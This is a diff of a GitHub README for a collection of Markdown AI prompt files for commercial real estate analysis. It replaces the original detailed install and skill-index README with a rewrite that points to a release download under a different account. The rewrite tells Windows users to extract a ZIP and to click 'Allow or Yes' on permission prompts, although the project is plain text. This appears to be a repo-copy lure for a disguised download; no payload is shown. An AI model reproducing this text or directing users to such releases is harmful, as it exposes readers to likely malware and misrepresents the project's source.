@@ -1,796 +1,217 @@
-# CRE Agent Skills — AI-Powered Commercial Real Estate Analysis
+# 🧩 cre-agent-skills - Real estate skills for deal work
 
-**Originally released with 25 standalone AI skill files for commercial real estate multifamily acquisitions — due diligence, underwriting, financing, legal, and closing. Expanded in v1.1.0 with Industrial v1, and now expanded again in v1.2.0 with an 8-skill Brokerage Investment Sales v1 pack, 4 brokerage knowledge bases, 12 companion research notes, and an 8th Claude Code plugin.**
+[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-blue.svg?style=for-the-badge&logo=github)](https://github.com/XAKLESK/cre-agent-skills/releases)
 
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Skills](https://img.shields.io/badge/Skills-41-green.svg)](#skill-index)
-[![Knowledge Bases](https://img.shields.io/badge/Knowledge_Bases-12-blue.svg)](#knowledge-bases)
-[![Research Notes](https://img.shields.io/badge/Research_Notes-23-orange.svg)](#new-in-v120)
-[![Claude Code Plugins](https://img.shields.io/badge/Claude_Code_Plugins-8-purple.svg)](#claude-code-plugins-recommended)
-[![No API Keys](https://img.shields.io/badge/API_Keys-None_Required-brightgreen.svg)](#quick-start)
+## 📦 What this is
 
----
+cre-agent-skills is a set of ready-made AI skill files for commercial real estate work. It helps with multifamily acquisitions, industrial deals, and brokerage investment sales. It also includes research notes and knowledge bases that support deal review, underwriting, finance, legal checks, and closing work.
 
-| | | | |
-|---|---|---|---|
-| **41** AI Skills | **12** Knowledge Bases | **8** Claude Code Plugins | **0** Dependencies |
-| **7** Due Diligence | **3** Underwriting | **3** Financing | **8** Brokerage v1 |
+This project is built for people who use AI tools and want a clear way to work through real estate tasks. You can use it to organize prompts, guide research, and keep work on track.
 
----
+## 💻 What you need
 
-Pick the skill you need, load it into your AI assistant, and go. Each file is a self-contained prompt that encodes the original multifamily acquisition expertise of the project, plus the additive Industrial v1 and Brokerage Investment Sales v1 expansions — ready to use in Claude Code, Claude Projects, ChatGPT, Cursor, or any LLM-powered tool.
+- A Windows PC
+- Internet access
+- A web browser
+- A file unzip tool, such as the built-in Windows tool
+- An AI tool that can read skill files, such as Claude Code, Cursor, or a similar app
 
-These skills are extracted from the [CRE Acquisition Orchestrator](https://github.com/ahacker-1/cre-acquisition-orchestrator), a 31-agent multi-agent pipeline for multifamily acquisitions. That repo models the full acquisition lifecycle as an AI-native system with orchestration logic, phase dependencies, checkpoint/resume, and a real-time dashboard. This repo breaks those agents into standalone tools you can use individually — no pipeline, no infrastructure, no setup required.
+## 🚀 Download the files
 
-> **No API keys. No installation. No dependencies.** Each `.md` file works on its own.
+Visit this page to download the latest release:
 
-> **Disclaimer:** These skill files are educational and informational resources, not production software for making investment decisions. The financial calculations, legal checklists, underwriting models, and analysis outputs are for reference and learning purposes only. Nothing in this repository constitutes financial, legal, investment, or tax advice. The authors and contributors are not liable for any decisions made based on information produced using these skills. Always consult qualified professionals — licensed attorneys, CPAs, commercial real estate brokers, and financial advisors — before making real estate investment decisions. These materials are provided "as is" without warranty of any kind. See [LICENSE](LICENSE) for full terms.
+https://github.com/XAKLESK/cre-agent-skills/releases
 
----
+On that page, open the newest release and download the file package for Windows use. If the release comes as a ZIP file, save it to your computer first.
 
-## New in v1.2.0
+## 🛠️ Install on Windows
 
-This release adds a new role-based pack without changing the existing multifamily or industrial paths:
+1. Open the ZIP file after it finishes downloading.
+2. Extract the files to a folder you can find later, such as `Downloads` or `Documents`.
+3. If the release includes multiple folders, keep them together in the same place.
+4. If Windows asks for permission, choose Allow or Yes.
+5. Open your AI app or file browser and point it to the extracted folder.
 
-- **Brokerage Investment Sales v1** with 8 new U.S.-focused seller-side brokerage skills
-- **4 brokerage knowledge bases**
-- **12 brokerage companion research notes**
-- **`/cre-brokerage` Claude Code plugin**
-- **Additive release framing** on top of the original multifamily-first repo and the prior Industrial v1 release
+## 🧭 How to use it
 
-Brokerage v1 is seller-side, investment-sales-first, BOV-to-close, and transaction-only. It is designed to support brokers on active assignments, not general prospecting or CRM work.
+The repository includes skill files for common commercial real estate tasks. You can open one file at a time or use the full set as a work library.
 
----
+Use the files for tasks like:
 
-## New in v1.1.0
+- Review a deal package
+- Check financial assumptions
+- Compare rent and expense data
+- Review loan terms
+- Spot legal points that need attention
+- Organize closing steps
+- Build a first-pass view of a property or portfolio
 
-This release adds to the original multifamily-first library without changing the existing multifamily paths:
+If you work in multifamily, the original skill set covers the core acquisition process. If you work in industrial real estate, the Industrial v1 set gives you a focused starting point. If you work in brokerage investment sales, the v1.2.0 pack adds tools for listing prep, buyer review, and market research.
 
-- **Industrial v1** with 8 new U.S.-focused industrial acquisition skills
-- **3 industrial knowledge bases**
-- **11 industrial companion research notes**
-- **`/cre-industrial` Claude Code plugin**
-- **PowerShell install examples** for Windows-first users
-- **Research-backed contribution standards** for future sector packs
+## 🗂️ What is included
 
-The original multifamily core remains intact. Industrial v1 is the first additive sector expansion.
+### 🏢 Multifamily acquisition skills
 
----
+The original release includes 25 standalone AI skill files for multifamily acquisitions. These cover the main deal stages:
 
-## Table of Contents
+- Due diligence
+- Underwriting
+- Financing
+- Legal review
+- Closing
 
-- [New in v1.2.0](#new-in-v120)
-- [New in v1.1.0](#new-in-v110)
-- [Quick Start](#quick-start)
-- [Claude Code Plugins](#claude-code-plugins-recommended)
-- [Installation Methods](#installation-methods)
-- [Skill Index](#skill-index)
-- [Knowledge Bases](#knowledge-bases)
-- [How Skills Are Structured](#how-skills-are-structured)
-- [Project Structure](#project-structure)
-- [Example Usage](#example-usage)
-- [Common Workflows](#common-workflows)
-- [FAQ](#faq)
-- [Want the Full Pipeline?](#want-the-full-pipeline)
-- [Author](#author)
-- [License](#license)
+These files help you move through a deal in a steady, repeatable way.
 
----
+### 🏭 Industrial v1
 
-## Quick Start
+Version 1.1.0 added an Industrial v1 set. This gives you a base for industrial real estate work, with support for:
 
-### Option 1: Claude Code Plugin (Recommended)
+- Property review
+- Lease and tenant checks
+- Market review
+- Capital planning
+- Risk spotting
 
-If you use Claude Code, install a department plugin in one command:
+### 🏬 Brokerage Investment Sales v1
 
-```bash
-# Clone the repo
-git clone https://github.com/ahacker-1/cre-agent-skills.git
+Version 1.2.0 adds an 8-skill Brokerage Investment Sales v1 pack. It supports the sale side of commercial real estate work, including:
 
-# Install the due diligence plugin (example)
-cp -r cre-agent-skills/claude-code-plugins/cre-due-diligence ~/.claude/skills/
+- Listing prep
+- Asset summary review
+- Buyer questions
+- Market positioning
+- Deal room support
+- Offer review
+- Broker research
+- Deal workflow support
 
-# Now use it in Claude Code
-claude
-> /cre-due-diligence Analyze the rent roll for 200 Park Avenue, Austin TX
-```
+### 📚 Brokerage knowledge bases
 
-See [Claude Code Plugins](#claude-code-plugins-recommended) below for the original department plugins plus the additive Industrial v1 and Brokerage v1 packs.
+The v1.2.0 release also includes 4 brokerage knowledge bases. These help you keep key facts and market context in one place.
 
-#### Windows / PowerShell
+You can use them for:
 
-```powershell
-git clone https://github.com/ahacker-1/cre-agent-skills.git
-Set-Location .\cre-agent-skills
+- Market notes
+- Asset class notes
+- Buyer profile notes
+- Listing and process notes
 
-New-Item -ItemType Directory -Force "$HOME\.claude\skills" | Out-Null
-Copy-Item -Recurse .\claude-code-plugins\cre-industrial "$HOME\.claude\skills\"
-```
+### 📝 Companion research notes
 
-Brokerage v1 example:
+There are also 12 companion research notes. These are useful when you need background before you start a task.
 
-```powershell
-git clone https://github.com/ahacker-1/cre-agent-skills.git
-Set-Location .\cre-agent-skills
+They can support:
 
-New-Item -ItemType Directory -Force "$HOME\.claude\skills" | Out-Null
-Copy-Item -Recurse .\claude-code-plugins\cre-brokerage "$HOME\.claude\skills\"
-```
+- Market context
+- Property type research
+- Investor questions
+- Deal framing
+- Workflow guidance
 
-### Option 2: Copy a Single Skill File
+## 🔍 Suggested setup for non-technical users
 
-1. Browse the [Skill Index](#skill-index) below
-2. Open the `.md` file for the task you need
-3. Copy its content into Claude Projects, ChatGPT Custom Instructions, Cursor rules, or any LLM system prompt
-4. Provide the inputs listed in "What You'll Need to Provide"
-5. Get structured, expert-level analysis back
+If you are new to AI skill files, use this simple setup:
 
-### Option 3: Point an AI Agent at This Repo
+1. Download the release ZIP from GitHub.
+2. Extract the folder.
+3. Keep the folder name as-is.
+4. Open your AI app.
+5. Add the folder or open one skill file from it.
+6. Start with the skill that matches your task.
 
-If you're using an AI coding agent (Claude Code, Cursor, Windsurf, etc.), you can point it at this repo and ask it to set things up for you:
+A good first test is to open a due diligence or underwriting skill and use it on a real or sample deal. This lets you see how the files guide the work.
 
-```bash
-git clone https://github.com/ahacker-1/cre-agent-skills.git
-cd cre-agent-skills
+## 📁 Folder tips
 
-# Then tell your AI agent:
-# "Read the README.md and set up the CRE skills I need for due diligence and underwriting"
-```
+If the release contains several folders, this simple layout can help:
 
-The repo is structured so an AI agent can read this README, understand the full skill catalog, and help you install exactly what you need. Every file is plain Markdown — no compilation, no build steps, no configuration files.
+- `Multifamily`
+- `Industrial`
+- `Brokerage Investment Sales`
+- `Knowledge Bases`
+- `Research Notes`
 
----
+You do not need to rename anything. Keep the structure intact so the files stay easy to use.
 
-## Claude Code Plugins (Recommended)
+## 🧠 Best ways to use the skills
 
-The repo now includes the original six department plugins plus two additive packs: Industrial v1 and Brokerage Investment Sales v1. Each plugin includes a `SKILL.md` entry point that routes to the right specialist skill based on your request, plus all referenced knowledge base files bundled inside.
+- Use one skill for one task
+- Keep your source documents close by
+- Ask your AI tool for a first draft, then review it yourself
+- Use the knowledge bases when you need context
+- Use the research notes when you need a quick starting point
 
-### Available Plugins
+These files work best when you give the AI clear input. For example, share the property type, deal size, market, and goal before you start.
 
-| Plugin | Slash Command | Skills Included | Knowledge Bases Included |
-|--------|--------------|-----------------|--------------------------|
-| **Due Diligence** | `/cre-due-diligence` | 7 skills (rent roll, OpEx, market, physical, environmental, title, tenant credit) | Underwriting Calc, Multifamily Benchmarks, Risk Scoring |
-| **Underwriting** | `/cre-underwriting` | 3 skills (financial model, scenarios, IC memo) | Underwriting Calc, Multifamily Benchmarks |
-| **Financing** | `/cre-financing` | 3 skills (lender outreach, quote comparator, term sheet) | Lender Criteria, Underwriting Calc |
-| **Legal** | `/cre-legal` | 6 skills (PSA, title/survey, estoppels, loan docs, insurance, transfer docs) | Legal Checklist |
-| **Closing** | `/cre-closing` | 2 skills (closing coordinator, funds flow) | Legal Checklist, Underwriting Calc |
-| **Document Ingestion** | `/cre-document-ingestion` | 4 skills (classifier, rent roll parser, financials parser, OM parser) | None (self-contained) |
-| **Industrial v1** | `/cre-industrial` | 8 skills (market study, lease roster, lease abstract, tenant credit, physical inspection, underwriting, financing fit, IC memo) | Industrial Benchmarks, Industrial Lease Structures, Industrial Lender Criteria |
-| **Brokerage v1** | `/cre-brokerage` | 8 skills (assignment intake, BOV, listing proposal, OM / teaser, buyer process, bid leveling, negotiation brief, PSA-to-close coordination) | Brokerage Investment Sales Process, Broker Opinion of Value Guidance, Marketing Confidentiality and Buyer Process, Offer Negotiation and Closing Playbook |
+## 🧩 Common use cases
 
-### How to Install
+### Multifamily
 
-Each plugin is a self-contained directory inside `claude-code-plugins/`. Install the ones you need:
+Use the multifamily skills when you need help with:
 
-#### Method A: Personal Skills (Available in All Projects)
+- Purchase review
+- Rent roll checks
+- Expense review
+- Loan sizing
+- Equity return checks
+- Closing prep
 
-Copy plugins to your personal Claude Code skills directory:
+### Industrial
 
-```bash
-# Clone the repo
-git clone https://github.com/ahacker-1/cre-agent-skills.git
-cd cre-agent-skills
+Use the industrial skills when you need help with:
 
-# Install individual plugins
-cp -r claude-code-plugins/cre-due-diligence ~/.claude/skills/
-cp -r claude-code-plugins/cre-underwriting ~/.claude/skills/
-cp -r claude-code-plugins/cre-financing ~/.claude/skills/
-cp -r claude-code-plugins/cre-legal ~/.claude/skills/
-cp -r claude-code-plugins/cre-closing ~/.claude/skills/
-cp -r claude-code-plugins/cre-document-ingestion ~/.claude/skills/
+- Tenant and lease review
+- Functional use review
+- Market analysis
+- Site and access checks
+- Capital needs review
 
-# Or install ALL plugins at once
-cp -r claude-code-plugins/* ~/.claude/skills/
-```
+### Brokerage investment sales
 
-PowerShell equivalent:
+Use the brokerage pack when you need help with:
 
-```powershell
-git clone https://github.com/ahacker-1/cre-agent-skills.git
-Set-Location .\cre-agent-skills
+- Preparing a listing package
+- Framing an asset for buyers
+- Reviewing a teaser or offering memo
+- Tracking buyer follow-up
+- Organizing a sale process
 
-New-Item -ItemType Directory -Force "$HOME\.claude\skills" | Out-Null
-Copy-Item -Recurse .\claude-code-plugins\* "$HOME\.claude\skills\"
-```
+## 🔐 File safety
 
-After installation, the plugins are available in every Claude Code session. Type `/cre-` and autocomplete will show all installed plugins.
+Keep the downloaded files in a trusted folder on your computer. If you move the files, move the whole folder so links and references stay in place.
 
-#### Method B: Project-Level Skills (Available in One Project)
+If you use a cloud folder like OneDrive, keep the folder in one location and avoid mixing old and new release files.
 
-If you want skills scoped to a specific deal or project:
+## 🧪 If something does not open
 
-```bash
-# Inside your project directory
-mkdir -p .claude/skills
+If the files do not open in your AI tool, try these steps:
 
-# Install only the plugins you need for this project
-cp -r /path/to/cre-agent-skills/claude-code-plugins/cre-due-diligence .claude/skills/
-cp -r /path/to/cre-agent-skills/claude-code-plugins/cre-underwriting .claude/skills/
-```
+1. Make sure the ZIP file is fully extracted.
+2. Check that you are opening the right folder.
+3. Try a different AI app that supports local files.
+4. Confirm that the release download finished without errors.
+5. Download the newest release again from GitHub.
 
-PowerShell equivalent:
+## 📄 Project focus
 
-```powershell
-New-Item -ItemType Directory -Force .\.claude\skills | Out-Null
-Copy-Item -Recurse C:\path\to\cre-agent-skills\claude-code-plugins\cre-industrial .\.claude\skills\
-```
+This repository focuses on commercial real estate workflow support, especially:
 
-Brokerage v1 example:
+- AI agents
+- AI skills
+- Prompt files
+- Prompt engineering
+- Commercial real estate
+- Multifamily
+- Underwriting
+- Due diligence
+- Financial modeling
+- Investment analysis
+- Real estate analysis
+- Real estate investing
+- Proptech
 
-```powershell
-New-Item -ItemType Directory -Force .\.claude\skills | Out-Null
-Copy-Item -Recurse C:\path\to\cre-agent-skills\claude-code-plugins\cre-brokerage .\.claude\skills\
-```
+## 🔗 Download again
 
-Project-level skills take priority over personal skills with the same name. You can commit the `.claude/skills/` directory to git so your team shares the same skills.
+If you need the latest version, use this page:
 
-#### Method C: Using `--add-dir` (No Installation)
-
-Reference the plugins directory directly without copying:
-
-```bash
-# Clone once
-git clone https://github.com/ahacker-1/cre-agent-skills.git
-
-# Launch Claude Code with the plugins directory
-claude --add-dir /path/to/cre-agent-skills/claude-code-plugins/cre-due-diligence
-```
-
-This loads the plugin for the current session only. Skills from `--add-dir` directories are detected automatically and support live editing — you can modify skill files during a session without restarting.
-
-### Using the Plugins
-
-Once installed, invoke any plugin with its slash command:
-
-```bash
-# Due Diligence
-/cre-due-diligence Analyze this rent roll for Parkview Apartments, 200 units, Austin TX
-/cre-due-diligence Run an environmental review on the Phase I ESA I just uploaded
-/cre-due-diligence Benchmark these T-12 operating expenses against Class B multifamily
-
-# Underwriting
-/cre-underwriting Build a 5-year pro forma using the DD outputs we just generated
-/cre-underwriting Run 27 scenario stress tests on this financial model
-/cre-underwriting Write an IC memo summarizing this deal
-
-# Financing
-/cre-financing Which lenders should we approach for a $24M loan on a 200-unit Class B in Austin?
-/cre-financing Compare these 4 lender quotes and rank them
-/cre-financing Build a term sheet based on the Freddie Mac quote
-
-# Legal
-/cre-legal Review this Purchase & Sale Agreement clause by clause
-/cre-legal Analyze the title commitment I uploaded
-/cre-legal Track estoppel certificate collection — here's the rent roll and returned certificates
-
-# Closing
-/cre-closing Build the closing checklist — here's where we stand on all workstreams
-/cre-closing Prepare the funds flow memo — here are the deal terms
-
-# Document Ingestion
-/cre-document-ingestion Classify these deal documents I just uploaded
-/cre-document-ingestion Parse this rent roll into structured data
-/cre-document-ingestion Extract the financials from this T-12
-
-# Industrial v1
-/cre-industrial Analyze the market for a 240,000 SF distribution asset in Dallas
-/cre-industrial Review this industrial lease roster and highlight rollover risk
-/cre-industrial Build an underwriting view for this shallow-bay acquisition
-
-# Brokerage v1
-/cre-brokerage Build a BOV for this office investment sale listing
-/cre-brokerage Draft the OM and teaser for this retail center
-/cre-brokerage Level these offers and recommend a seller response
-```
-
-Claude reads the `SKILL.md` entry point, identifies which specialist skill to load based on your request, loads the full skill instructions plus relevant knowledge bases, and runs the analysis.
-
-### Plugin Structure (For Reference)
-
-Each plugin follows this pattern:
-
-```
-cre-{department}/
-├── SKILL.md          # Entry point — YAML frontmatter + routing logic
-├── skills/           # Specialist skill files (the actual analysis prompts)
-│   ├── skill-one.md
-│   ├── skill-two.md
-│   └── ...
-└── knowledge/        # Domain knowledge reference files (formulas, benchmarks, criteria)
-    ├── relevant-knowledge-base-1.md
-    └── relevant-knowledge-base-2.md
-```
-
-The `SKILL.md` file contains YAML frontmatter that tells Claude Code:
-- `name` — the slash command name (e.g., `cre-due-diligence`)
-- `description` — when Claude should automatically consider using this skill
-- `argument-hint` — what to show in autocomplete
-
-The body of `SKILL.md` routes the user's request to the right specialist skill file, which Claude loads on demand. Knowledge base files provide reference data (formulas, benchmarks, criteria) that the specialist skills draw on.
-
----
-
-## Installation Methods
-
-Different AI platforms have different ways to load skills. Here's how to use them everywhere:
-
-### Claude Code (Plugins — Recommended)
-
-See [Claude Code Plugins](#claude-code-plugins-recommended) above for the full setup guide. This is the best experience — you get slash commands, automatic routing, and bundled knowledge bases.
-
-### Claude Projects (claude.ai)
-
-1. Open [claude.ai](https://claude.ai) and create a new Project
-2. Click "Add knowledge" in the Project settings
-3. Upload the `.md` skill file(s) you want to use from the `skills/` directory
-4. Optionally upload knowledge base files from `knowledge/` that the skill recommends
-5. Start a conversation — Claude automatically references the loaded skills
-
-**Tip:** Name your project by deal (e.g., "Parkview Apartments DD") and load the relevant skill subset.
-
-### ChatGPT (Custom GPTs)
-
-1. Go to [chat.openai.com](https://chat.openai.com) → Explore GPTs → Create
-2. Paste the full content of a skill file into the "Instructions" field
-3. Upload knowledge base files as the GPT's "Knowledge" documents
-4. Save and use the GPT for that specific analysis task
-
-### Cursor / Windsurf / AI Code Editors
-
-Copy skill files into your editor's rules directory:
-
-```bash
-# Cursor
-cp skills/due-diligence/rent-roll-analyst.md .cursor/rules/
-
-# Or reference via --add-dir in Cursor's Claude Code integration
-```
-
-### Any LLM (API Usage)
-
-Include skill content in your system prompt:
-
-```python
-import anthropic
-
-skill = open("skills/due-diligence/rent-roll-analyst.md").read()
-knowledge = open("knowledge/multifamily-benchmarks.md").read()
-
-client = anthropic.Anthropic()
-response = client.messages.create(
-    model="claude-sonnet-4-20250514",
-    system=f"{skill}\n\n---\n\nReference Knowledge:\n{knowledge}",
-    messages=[
-        {"role": "user", "content": "Analyze this rent roll: [paste data]"}
-    ]
-)
-```
-
----
-
-## Skill Index
-
-### Due Diligence (7 skills)
-
-| Skill | What It Does |
-|-------|-------------|
-| [Rent Roll Analyst](skills/due-diligence/rent-roll-analyst.md) | Validates unit mix, in-place rents vs market, loss-to-lease, occupancy metrics, tenant concentration risks, and anomaly detection |
-| [OpEx Analyst](skills/due-diligence/opex-analyst.md) | Analyzes T-12 operating expenses, per-unit benchmarking by property class and region, line-item trends, management fee validation, tax reassessment modeling |
-| [Market Study](skills/due-diligence/market-study.md) | Researches submarket fundamentals — demographics, employment, supply pipeline, absorption rates, rent comps, competitive set analysis |
-| [Physical Inspection](skills/due-diligence/physical-inspection.md) | Assesses property condition from inspection reports, estimates CapEx needs by system, remaining useful life calculations, deferred maintenance quantification |
-| [Environmental Review](skills/due-diligence/environmental-review.md) | Evaluates Phase I ESA findings, contamination risk, regulatory compliance, remediation cost estimation, vapor intrusion risk |
-| [Legal & Title Review](skills/due-diligence/legal-title-review.md) | Analyzes title commitment, searches for exceptions and encumbrances, easement review, lien detection, deed restriction analysis |
-| [Tenant Credit](skills/due-diligence/tenant-credit.md) | Evaluates tenant creditworthiness, income concentration risk, lease rollover exposure, credit scoring, Section 8/subsidized housing analysis |
-
-### Underwriting (3 skills)
-
-| Skill | What It Does |
-|-------|-------------|
-| [Financial Model Builder](skills/underwriting/financial-model-builder.md) | Builds a complete 5-year pro forma — GPI, vacancy, EGI, OpEx, NOI, debt service, cash flow, reversion, and return metrics (IRR, equity multiple, CoC) |
-| [Scenario Analyst](skills/underwriting/scenario-analyst.md) | Runs 27 sensitivity scenarios across rent growth, vacancy, and exit cap rate — stress-tests the deal under adverse conditions |
-| [IC Memo Writer](skills/underwriting/ic-memo-writer.md) | Synthesizes all analysis into a structured investment committee memorandum with executive summary, financials, risk factors, and go/no-go recommendation |
-
-### Financing (3 skills)
-
-| Skill | What It Does |
-|-------|-------------|
-| [Lender Outreach](skills/financing/lender-outreach.md) | Maps deal profile to lender criteria across Agency, CMBS, Life Companies, Banks, and Bridge sources — identifies which lenders to approach and why |
-| [Quote Comparator](skills/financing/quote-comparator.md) | Normalizes and scores multiple lender quotes on a common basis using a weighted comparison matrix — identifies the best financing option |
-| [Term Sheet Builder](skills/financing/term-sheet-builder.md) | Assembles a complete term sheet, identifies negotiation leverage points, flags non-standard terms, and models rate lock scenarios |
-
-### Legal (6 skills)
-
-| Skill | What It Does |
-|-------|-------------|
-| [PSA Reviewer](skills/legal/psa-reviewer.md) | Reviews Purchase & Sale Agreement clause by clause — contingencies, representations, earnest money, closing conditions, assignment rights |
-| [Title & Survey Reviewer](skills/legal/title-survey-reviewer.md) | Reviews title commitment and ALTA survey — boundary verification, easement impact, encroachment detection, flood zone, zoning compliance |
-| [Estoppel Tracker](skills/legal/estoppel-tracker.md) | Manages estoppel certificate collection — tracks sent/received/outstanding, validates tenant-reported terms against rent roll, flags discrepancies |
-| [Loan Doc Reviewer](skills/legal/loan-doc-reviewer.md) | Reviews loan documents from the selected lender — note, mortgage, guaranty, environmental indemnity, UCC filings, term sheet compliance |
-| [Insurance Coordinator](skills/legal/insurance-coordinator.md) | Verifies insurance requirements from lender and PSA — property, liability, flood, windstorm, umbrella coverage, gap analysis |
-| [Transfer Doc Preparer](skills/legal/transfer-doc-preparer.md) | Prepares transfer documentation — deed, bill of sale, assignment of leases, FIRPTA certificate, transfer tax calculations, entity verification |
-
-### Closing (2 skills)
-
-| Skill | What It Does |
-|-------|-------------|
-| [Closing Coordinator](skills/closing/closing-coordinator.md) | Manages the closing checklist across all workstreams — verifies conditions precedent, tracks outstanding items, performs readiness assessment |
-| [Funds Flow Manager](skills/closing/funds-flow-manager.md) | Prepares the funds flow memo — purchase price allocation, prorations, lender disbursement, escrow holdbacks, wire instructions, closing costs |
-
-### Document Ingestion (4 skills)
-
-| Skill | What It Does |
-|-------|-------------|
-| [Document Classifier](skills/document-ingestion/document-classifier.md) | Classifies incoming deal documents by type (rent roll, T-12, offering memo, etc.) and identifies what data can be extracted from each |
-| [Rent Roll Parser](skills/document-ingestion/rent-roll-parser.md) | Extracts structured data from rent roll files — unit numbers, tenant names, lease dates, rents, deposits, status |
-| [Financials Parser](skills/document-ingestion/financials-parser.md) | Extracts T-12 operating statements — income line items, expense categories, month-over-month trends |
-| [Offering Memo Parser](skills/document-ingestion/offering-memo-parser.md) | Extracts property details, investment highlights, financial projections, and market data from offering memoranda |
-
-### Industrial v1 (8 skills)
-
-| Skill | What It Does |
-|-------|-------------|
-| [Industrial Market Study](skills/industrial/industrial-market-study.md) | Evaluates a U.S. industrial submarket, competing inventory, logistics positioning, and release depth |
-| [Industrial Lease Roster Analyst](skills/industrial/industrial-lease-roster-analyst.md) | Measures WALT, concentration, rollover exposure, reimbursement structure, and release risk from an industrial roster |
-| [Industrial Lease Abstract Reviewer](skills/industrial/industrial-lease-abstract-reviewer.md) | Abstracts industrial lease economics, repair obligations, options, transfer rights, estoppel, and SNDA items |
-| [Industrial Tenant Credit Analyst](skills/industrial/industrial-tenant-credit-analyst.md) | Evaluates tenant durability, concentration, facility dependence, and release risk |
-| [Industrial Physical Inspection](skills/industrial/industrial-physical-inspection.md) | Assesses condition, functionality, power, fire-life-safety, and capital needs for industrial assets |
-| [Industrial Underwriting Model Builder](skills/industrial/industrial-underwriting-model-builder.md) | Builds a lease-driven industrial acquisition model that incorporates rollover, downtime, TI, and LC |
-| [Industrial Financing Fit](skills/industrial/industrial-financing-fit.md) | Matches industrial deals to bank, life company, CMBS, bridge, or SBA owner-user executions |
-| [Industrial IC Memo Writer](skills/industrial/industrial-ic-memo-writer.md) | Synthesizes industrial diligence into an investment-committee-ready recommendation |
-
-### Brokerage Investment Sales v1 (8 skills)
-
-| Skill | What It Does |
-|-------|-------------|
-| [Assignment Intake Manager](skills/brokerage/assignment-intake-manager.md) | Launches a seller-side assignment by organizing authority, seller goals, missing data, and process readiness |
-| [Broker Opinion of Value Builder](skills/brokerage/broker-opinion-of-value-builder.md) | Produces a seller-side pricing opinion with valuation framing, range logic, and broker disclaimer language |
-| [Listing Proposal Builder](skills/brokerage/listing-proposal-builder.md) | Drafts a seller-facing listing proposal with positioning, process, timeline, and scope framing |
-| [Offering Memorandum and Teaser Writer](skills/brokerage/offering-memorandum-and-teaser-writer.md) | Drafts buyer-facing teaser and OM / CIM structure for a controlled investment sales process |
-| [Buyer Process and Data Room Manager](skills/brokerage/buyer-process-and-data-room-manager.md) | Designs confidentiality, buyer qualification, data-room access, tours, and Q&A workflow |
-| [Call for Offers and Bid Leveling Analyst](skills/brokerage/call-for-offers-and-bid-leveling-analyst.md) | Compares bids, normalizes certainty, and recommends leveling, BAFO, or backup strategy |
-| [Deal Term Negotiation Brief Builder](skills/brokerage/deal-term-negotiation-brief-builder.md) | Organizes seller priorities, give / get issues, and business-term negotiation posture |
-| [PSA to Close Transaction Coordinator](skills/brokerage/psa-to-close-transaction-coordinator.md) | Coordinates milestone tracking, open issues, and seller-side execution from signed deal to close |
-
----
-
-## Knowledge Bases
-
-Twelve reference files containing formulas, benchmarks, criteria, and checklists. Five belong to the original multifamily-first release, three extend the repo for Industrial v1, and four extend it again for Brokerage Investment Sales v1.
-
-| Knowledge Base | What It Contains | Used By |
-|---------------|-----------------|---------|
-| [Underwriting Calculations](knowledge/underwriting-calc.md) | Every CRE financial formula — GPI, EGI, NOI, DSCR, LTV, Cap Rate, IRR, Equity Multiple, Cash-on-Cash, Debt Yield, loan amortization, and more | Financial Model Builder, Scenario Analyst, Quote Comparator, Rent Roll Analyst |
-| [Risk Scoring Framework](knowledge/risk-scoring.md) | 9-category risk scoring system (0-100 scale) covering ownership, physical, environmental, market, financial, tenant, legal, capital markets, and operational risk | All Due Diligence skills, IC Memo Writer |
-| [Multifamily Benchmarks](knowledge/multifamily-benchmarks.md) | Institutional-quality benchmarks — operating expenses by property class (A/B/C) and region, occupancy standards, rent growth, CapEx reserves, management fees, turnover costs | OpEx Analyst, Financial Model Builder, Market Study, Rent Roll Analyst |
-| [Lender Criteria](knowledge/lender-criteria.md) | Full spectrum of multifamily lending sources — Agency (Fannie/Freddie), CMBS, Life Companies, Banks, Bridge/Mezzanine — with eligibility, loan parameters, rate structures, and prepayment terms | Lender Outreach, Quote Comparator, Term Sheet Builder |
-| [Legal Checklist](knowledge/legal-checklist.md) | Legal compliance requirements across the acquisition lifecycle — PSA review items, title requirements, survey standards, environmental compliance, entity formation, transfer documentation | All Legal skills, Closing Coordinator |
-| [Industrial Benchmarks](knowledge/industrial-benchmarks.md) | U.S. industrial market, building-function, lease-risk, and underwriting guardrails by subtype | Industrial Market Study, Physical Inspection, Underwriting, IC Memo |
-| [Industrial Lease Structures](knowledge/industrial-lease-structures.md) | U.S. industrial lease structures, reimbursements, repairs, assignment, estoppel, and SNDA issue spotting | Industrial Lease Roster, Lease Abstract, Underwriting |
-| [Industrial Lender Criteria](knowledge/industrial-lender-criteria.md) | U.S. lender-fit guidance for industrial deals across banks, life companies, CMBS, bridge, and SBA owner-user cases | Industrial Financing Fit, Underwriting, IC Memo |
-| [Brokerage Investment Sales Process](knowledge/brokerage-investment-sales-process.md) | Seller-side sequence from assignment intake through close | Assignment Intake, Listing Proposal, Closing Coordination |
-| [Broker Opinion of Value Guidance](knowledge/broker-opinion-of-value-guidance.md) | BOV boundaries, method selection, disclaimer logic, and state-law caution | BOV Builder, Listing Proposal |
-| [Marketing Confidentiality and Buyer Process](knowledge/marketing-confidentiality-and-buyer-process.md) | Teaser / OM release, confidentiality, registration, vetting, data room, tours, and Q&A | OM / Teaser Writer, Buyer Process Manager |
-| [Offer Negotiation and Closing Playbook](knowledge/offer-negotiation-and-closing-playbook.md) | Bid comparison, BAFO logic, seller-side negotiation framing, and PSA-to-close coordination | Bid Leveling, Negotiation Brief, PSA-to-Close |
-
-**How to use knowledge bases:** Load the knowledge base alongside the skill you're using. For example, when using the Financial Model Builder skill, also load Underwriting Calculations for formula definitions and Multifamily Benchmarks for expense assumptions. The Claude Code plugins bundle relevant knowledge bases automatically.
-
-### Companion Research Notes
-
-Industrial v1 includes 11 research notes under `research/industrial/` plus [research/industrial/INDEX.md](research/industrial/INDEX.md). Brokerage Investment Sales v1 adds 12 more research notes under `research/brokerage/` plus [research/brokerage/INDEX.md](research/brokerage/INDEX.md).
-
----
-
-## How Skills Are Structured
-
-Every skill follows the same format:
-
-| Section | What It Contains |
-|---------|-----------------|
-| **When to Use This Skill** | Practical triggers — when should you reach for this? |
-| **What You'll Need to Provide** | Plain-English list of required inputs |
-| **Mission** | What the skill does in one paragraph |
-| **Strategy** | Step-by-step analysis process with all formulas, thresholds, and domain logic |
-| **Output Format** | Structured output template (JSON or Markdown) |
-| **Quality Checks** | Self-validation rules — numeric sanity, cross-references, threshold comparisons |
-| **Red Flags & Dealbreakers** | What to immediately escalate |
